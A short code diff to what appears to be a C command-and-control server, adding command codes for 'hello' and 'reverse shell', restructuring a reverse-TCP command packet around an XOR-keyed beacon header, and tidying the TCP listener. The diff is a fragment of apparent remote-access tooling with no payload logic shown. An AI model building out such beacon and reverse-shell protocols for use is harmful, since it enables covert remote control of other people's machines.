@@ -33,6 +33,12 @@
 #define NET_PACKET_MAX_SIZE 1024
 #endif
 
+#ifndef NET_COMMANDS
+#define NET_COMMAND_HELLO         0
+#define NET_COMMAND_REVERSE_SHELL 1
+#define NET_COMMANDS
+#endif
+
 #ifndef NET_PACKET_BEACON
 typedef struct{
   int xor_key;
@@ -43,8 +49,7 @@ typedef struct{
 
 #ifndef NET_PACKET_CMD_REVERSE_TCP
 typedef struct{
-  int xor_key;
-  int command;
+  net_packet_beacon_t header;
   shell_reverse_tcp_args_t args;
 } net_packet_cmd_reverse_tcp_t;
 #define NET_PACKET_CMD_REVERSE_TCP
@@ -82,8 +87,6 @@ bool net_start_server(int port){
   server.sin_family = AF_INET;
   server.sin_port = htons(port);
   server.sin_addr.s_addr = htonl(INADDR_ANY);
-  //int opt_val = 1;
-  //setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof opt_val);
 
   // bind to socket
   err = bind(server_fd, (struct sockaddr *) &server, sizeof(server));
@@ -96,7 +99,7 @@ bool net_start_server(int port){
 
   // listener
   if (listen(server_fd, 128)  == 0){
-    printf("[+] listening...\n");
+    printf("[*] listening...\n");
   } else{
     fprintf(stderr, "[-] listen to socket failed\n");
   }
@@ -131,4 +134,5 @@ bool net_start_server(int port){
     }
   }
   close(client_fd);
+  return true;
 }
